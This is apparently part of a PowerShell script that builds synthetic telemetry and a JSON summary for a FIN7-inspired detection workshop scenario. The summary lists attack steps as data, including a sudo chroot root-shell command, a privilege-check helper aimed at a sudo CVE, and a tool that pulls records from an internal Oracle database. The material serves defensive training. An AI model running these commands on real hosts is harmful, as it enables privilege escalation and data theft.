        TimeGenerated = Format-WorkshopTime $StartTime.AddMinutes(-10)
        DeviceId = $win04.DeviceId
        DeviceName = $win04.Name
        AccountName = $victor.Name
        AccountUpn = $victor.Upn
        AccountObjectId = $victor.ObjectId
        AccountDisplayName = $victor.DisplayName
        AccountDomain = $adDomain
        AADTenantId = $tenantId
        TenantId = $tenantId
        ActionType = 'WorkshopBaseline'
        Application = 'WorkshopBaseline'
        ReportId = 9900
        Type = $table
    }
}

foreach ($table in ($script:Schemas.Keys | Sort-Object)) {
    Write-WorkshopTableData -Table $table
}

$summary = [ordered]@{
    scenarioName = 'FIN7-inspired hybrid identity credential access'
    startTime = Format-WorkshopTime $StartTime
    telemetryWindow = [ordered]@{
        endTime = Format-WorkshopTime $script:TelemetryEndTime
        lookbackDays = $NormalLookbackDays
        earliestNormalTime = Format-WorkshopTime $script:TelemetryEndTime.AddDays(-$NormalLookbackDays)
    }
    tenantDomain = $tenantDomain
    adDomain = $adDomain
    infrastructure = [ordered]@{
        domainControllers = 2
        windows11Endpoints = 10
        ubuntuEndpoints = 5
        entraConnectServers = 1
    }
    identities = [ordered]@{
        users = $SyntheticUserCount
        serviceAccounts = $SyntheticServiceAccountCount
    }
    compromisedUser = $victor.Upn
    initialDevice = $win04.Name
    attackVectors = $attackSteps | Select-Object Title, Technique, Offset, Command
    linuxAttackVectors = @(
        [ordered]@{ Title = 'Suspicious SSH attempts against Ubuntu server'; Technique = 'T1021.004'; Offset = 61; Command = 'sshd authentication activity in /var/log/auth.log' }
        [ordered]@{ Title = 'Suspicious sudo chroot usage on Ubuntu server'; Technique = 'T1548.003'; Offset = 65; Command = 'sudo -R /tmp/.cache/nss /bin/bash -p' }
        [ordered]@{ Title = 'Unix shell and auditd evidence on Ubuntu server'; Technique = 'T1059.004'; Offset = 68; Command = 'auditd process execution evidence for sudo and bash' }
        [ordered]@{ Title = 'Synthetic Python privilege-check helper on Ubuntu server'; Technique = 'T1059.006'; Offset = 70; Command = 'python3 /tmp/.cache/oracle_privcheck.py --check sudo-cve-2025-32463 --target oracle' }
        [ordered]@{ Title = 'Synthetic Go binary accesses Oracle database over TNS'; Technique = 'T1005'; Offset = 72; Command = '/tmp/.cache/ora_collect_linux_amd64 --target 10.42.20.35:1521 --service ORCL --query-name finance-user-catalog' }
    )
}

$summary | ConvertTo-Json -Depth 10 | Set-Content -Path $SummaryPath -Encoding UTF8
